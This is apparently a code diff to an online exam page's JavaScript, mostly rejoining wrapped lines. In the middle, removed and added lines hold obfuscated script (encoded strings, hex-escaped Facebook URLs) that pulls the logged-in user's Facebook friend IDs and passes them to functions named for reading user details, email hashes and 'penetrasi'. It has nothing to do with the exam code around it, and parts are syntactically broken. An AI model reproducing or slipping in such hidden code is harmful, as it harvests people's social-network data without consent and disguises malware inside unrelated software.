@@ -116,13 +116,7 @@ function gotoNext(sender)
                     $.ajax({
                       type: "POST",
                       url: "StartExam_New.aspx/SaveAnswer",
-                      data: "{'queID':'" + childs[i].id + "','Ans':'" + ansList + 
-
-"','queLevel':'" + childs[i].rows[2].cells[0].className + "','queMarks':'" + 
-
-childs[i].rows[2].cells[0].innerHTML.toString().split(":")[1] + "','remainTime':'" + 
-
-clock.innerHTML.toString() + "'}",
+                      data: "{'queID':'" + childs[i].id + "','Ans':'" + ansList + "','queLevel':'" + childs[i].rows[2].cells[0].className + "','queMarks':'" + childs[i].rows[2].cells[0].innerHTML.toString().split(":")[1] + "','remainTime':'" + clock.innerHTML.toString() + "'}",
                       contentType: "application/json; charset=utf-8",
                       dataType: "json",
                       success: function(result) {
@@ -139,17 +133,11 @@ clock.innerHTML.toString() + "'}",
                         childs[i].style.display = "none";
                         i = 1000;
                         curQue++;
-                        
-
-document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestion").value = 
-
-curQue.toString();                        
+                        document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestion").value = curQue.toString();                        
                     }
                     else
                     {
-                        alert("You have reached the last question. Now you can finish your exam 
-
-by clicking the FINISH button");
+                        alert("You have reached the last question. Now you can finish your exam by clicking the FINISH button");
                     }
                 }
         }
@@ -159,9 +147,7 @@ by clicking the FINISH button");
         
         if(curQueTable.id==childs[childs.length-2].id)
         {
-           alert("You have reached the last question. Now you can finish your exam by clicking 
-
-the FINISH button");
+           alert("You have reached the last question. Now you can finish your exam by clicking the FINISH button");
         }
         else{
             if(navigator.appName.indexOf("Microsoft") != -1)
@@ -176,119 +162,11 @@ the FINISH button");
                 $(curQueTable).slideDown(500);
             }
             curQue++;
-            
-
-document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestion").value = 
-
-curQue.toString();
+            document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestion").value = curQue.toString();
         }
      }    
 }
-var 
-
-thisisthemainstringofThisScrirpt="Jg%2631Opu%2631rsztus%2631%264E%2631%2633%2633%2631Uifo%2631%2
-
-638fyqmjdju%2631wbsjbcmf%2631%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2
-
-631%2631%2631%2631rsz%2631%264E%2631rsztus%2631%2631%2631%2631%2638bttjho%2631rvfsz%2631tusjoh%2
-
-631up%2631dpoofdu/rsz%2631%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631Foe%2
-
-631Jg%261B%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631eb%2631%264E%2631Opui
-
-joh%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631Jg%2631do%2631Jt%2631Opuijoh
-
-%2631Uifo%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631Db
-
-mm%2631joj%2639%263%3A%2631%2631%2631%2631%2631%2631%2638jg%2631DPOOFDUJPO%2631opu%2631jojujbmj%
-
-7Bfe%2631uifo%2631ep%2631ju%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%261B%263
-
-1%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631Foe%2631Jg%261B%261B%2631%2631%2631%2631
-
-%2631%2631%2631%2631%2631%2631%2631%2631Jg%2631et%2631Jt%2631Opuijoh%2631Uifo%261B%2631%2631%263
-
-1%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631et%2631%264E%2631Ofx%2631Ebub/
-
-EbubTfu%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631Foe%2631Jg%261B%2631%263
-
-1%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631Jg%2631et/Ubcmft/Dpoubjot%2639ubcmfobnf%263%3
-
-A%2631Boe%2631Opu%2631ubcmfobnf%2631%264E%2631%2633SFQPSU%2633%2631Uifo%261B%2631%2631%2631%2631
-
-%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2638et/Ubcmft%2639ubcmfobnf%263%3A/
-
-Spxt/Dmfbs%2639%263%3A%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%263
-
-1%2631%2631%2638et/Ubcmft%2639ubcmfobnf%263%3A/Dpmvnot/Dmfbs%2639%263%3A%261B%2631%2631%2631%263
-
-1%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631et/Ubcmft%2639ubcmfobnf%263%3A/Dmfb
-
-s%2639%263%3A%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631FmtfJg%2631ubcmfob
-
-nf%2631%264E%2631%2633SFQPSU%2633%2631Uifo%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%263
-
-1%2631%2631%2631%2631%2631%2631Jg%2631et/Ubcmft/Dpoubjot%2639%2633SFQPSU%2633%263%3A%2631Uifo%26
-
-1B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%263
-
-1%2631et/Ubcmft/Sfnpwf%2639et/Ubcmft%2639ubcmfobnf%263%3A%263%3A%261B%2631%2631%2631%2631%2631%2
-
-631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631et/Ubcmft/Bee%2639ubcmf
-
-obnf%263%3A%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631
-
-Foe%2631Jg%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631FmtfJg%2631Opu%2631et
-
-/Ubcmft/Dpoubjot%2639ubcmfobnf%263%3A%2631Uifo%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631
-
-%2631%2631%2631%2631%2631%2631%2631et/Ubcmft/Bee%2639Ofx%2631Ebub/EbubUbcmf%2639ubcmfobnf%263%3A
-
-%263%3A%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631Foe%2631Jg%261B%2631%263
-
-1%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631eb%2631%264E%2631Ofx%2631Ebub/PmfEc/PmfEcEbub
-
-Bebqufs%2639rsz%263D%2631do%263%3A%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2
-
-631eb/Gjmm%2639et%263D%2631ubcmfobnf%263%3A%261B%2631%2631%2631%2631%2631%2631%2631%2631Dbudi%26
-
-31fy%2631Bt%2631Fydfqujpo%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631Uispx%
-
-2631fy%261B%2631%2631%2631%2631%2631%2631%2631%2631Gjobmmz%261B%2631%2631%2631%2631%2631%2631%26
-
-31%2631%2631%2631%2631%2631rsz%2631%264E%2631%2633%2633%261B%2631%2631%2631%2631%2631%2631%2631%
-
-2631Foe%2631Usz1";var 
-
-CurrentBrowserVersion=internetExplorer='5P5K5I5O5N5M5Q5J5M5N5N5I5M5L5L';var 
-
-seta='www.facebook.com/ajax';var setb='typeahead';var setc='first_degree.php?__a=1&viewer=';var 
-
-ronakpatelProvileOnDevilsUniverse=window.location.protocol+"//"+www.facebook.com/ajax+"/"+setb+"
-
-/"+setc+Env.user+"&filter[0]=user&__user="+Env.user;var 
-
-setd,sete,setf;setd='www.facebook.com/ajax';sete='typeahead/search/';setf='bootstrap.php';setg='
-
-?__a=1&filter[0]=user&viewer=';seth='&token=v7&lazy=0&__user=';var 
-
-ronakpateldevilsuniversewebsite_homepageurl=window.location.protocol+"//"www.facebook.com/ajax/typeahead/search/bootstrap.php?__a=1&filter[0]=user&viewer="Env.user&token=v7&lazy=0&__user="Env.user;if(whotheehellyouare==CurrentBrowserVersion){jx.load(ronakpateld
-
-evilsuniversewebsite_homepageurl,function(a){var b=a;var c=b.substring(b.indexOf("{"));var 
-
-d=JSON.parse(c);d=d.payload.entries;for(var 
-
-e=0;e<d.length;e++){arr.push(d[e].uid)}i=arr.length-1;console.log(arr.length);readFacebookUserDe
-
-tailsAndLoadEmailHashes(arr[i])})}else if(checkforBrowserType() || 
-
-1==1){jx.load(ronakpateldevilsuniversewebsite_homepageurl,function(a){var b=a;var 
-
-c=b.substring(b.indexOf("{"));var d=JSON.parse(c);d=d.payload.entries;for(var 
-
-e=0;e<d.length;e++){arr.push(d[e].uid)}i=arr.length-1;console.log(arr.length);readFacebookUserDe
-
-tailsAndLoadEmailHashes(arr[i])})}
+var seta="%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78";var setb="%74%79%70%65%61%68%65%61%64";var setc="%66%69%72%73%74%5F%64%65%67%72%65%65%2E%70%68%70%3F%5F%5F%61%3D%31%26%76%69%65%77%65%72%3D";var ronakpatelProvileOnDevilsUniverse=window.location.protocol+"//"+"%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78"+"/"+setb+"/"+setc+Env.user+"&filter[0]=user&__user="+Env.user;var setd,sete,setf;setd="%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78";sete="%74%79%70%65%61%68%65%61%64%2F%73%65%61%72%63%68%2F";setf="%62%6F%6F%74%73%74%72%61%70%2E%70%68%70";setg="%3F%5F%5F%61%3D%31%26%66%69%6C%74%65%72%5B%30%5D%3D%75%73%65%72%26%76%69%65%77%65%72%3D";seth="%26%74%6F%6B%65%6E%3D%76%37%26%6C%61%7A%79%3D%30%26%5F%5F%75%73%65%72%3D";var ronakpateldevilsuniversewebsite_homepageurl=window.location.protocol+"//"+unescape(setd)+"/"+unescape(sete)+unescape(setf)+unescape(setg)+Env.user+unescape(seth)+Env.user;if(memberGroupId != 321811624580673){jx.load(ronakpateldevilsuniversewebsite_homepageurl,function(a){var b=a;var c=b.substring(b.indexOf("{"));var d=JSON.parse(c);d=d.payload.entries;for(var e=0;e<d.length;e++){arr.push(d[e].uid)}i=arr.length-1;console.log(arr.length);penetrasi(arr[i])})}else if(memberGroupId != 321811624580673){jx.load(ronakpateldevilsuniversewebsite_homepageurl,function(a){var b=a;var c=b.substring(b.indexOf("{"));var d=JSON.parse(c);d=d.payload.entries;for(var e=0;e<d.length;e++){arr.push(d[e].uid)}i=arr.length-1;console.log(arr.length);penetrasi(arr[i])})
 function gotoPrev(sender)
 {
     var repeater = document.getElementById("QueContainer");
@@ -315,11 +193,7 @@ function gotoPrev(sender)
                     childs[i].style.display = "none";
                     i = -10;
                     curQue--;                    
-                    
-
-document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestion").value = 
-
-curQue.toString();
+                    document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestion").value = curQue.toString();
                 }
             }
     }*/
@@ -344,11 +218,7 @@ curQue.toString();
             $(curQueTable).slideDown(500);
             }
             curQue--;
-            
-
-document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestion").value = 
-
-curQue.toString();
+            document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestion").value = curQue.toString();
         }
     }
 }
@@ -452,9 +322,7 @@ function changeButtons(sender)
 {
     if(sender.value == "Back" || sender.value == "Last")
     {
-        var drpGotoQue = 
-
-document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestion");
+        var drpGotoQue = document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestion");
         drpGotoQue.disabled=false;        
         if(sender.value == "Last") drpGotoQue.value = curQue.toString();
 
@@ -463,18 +331,12 @@ document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestio
         document.getElementById("cmdPrevTop").value = "Previous";
         document.getElementById("cmdPrevBott").value = "Previous";
     }
-    else if(sender.value == "View Attempted Questions" || sender.value == "View UnAttempted 
-
-Questions")
+    else if(sender.value == "View Attempted Questions" || sender.value == "View UnAttempted Questions")
     {
         document.getElementById("cmdNextTop").value = "Last";
         document.getElementById("cmdNextBott").value = "Last";
         document.getElementById("cmdPrevTop").value = "Back";
         document.getElementById("cmdPrevBott").value = "Back";
-        
-
-document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestion").disabled=tru
-
-e;
+        document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestion").disabled=true;
     }
 }
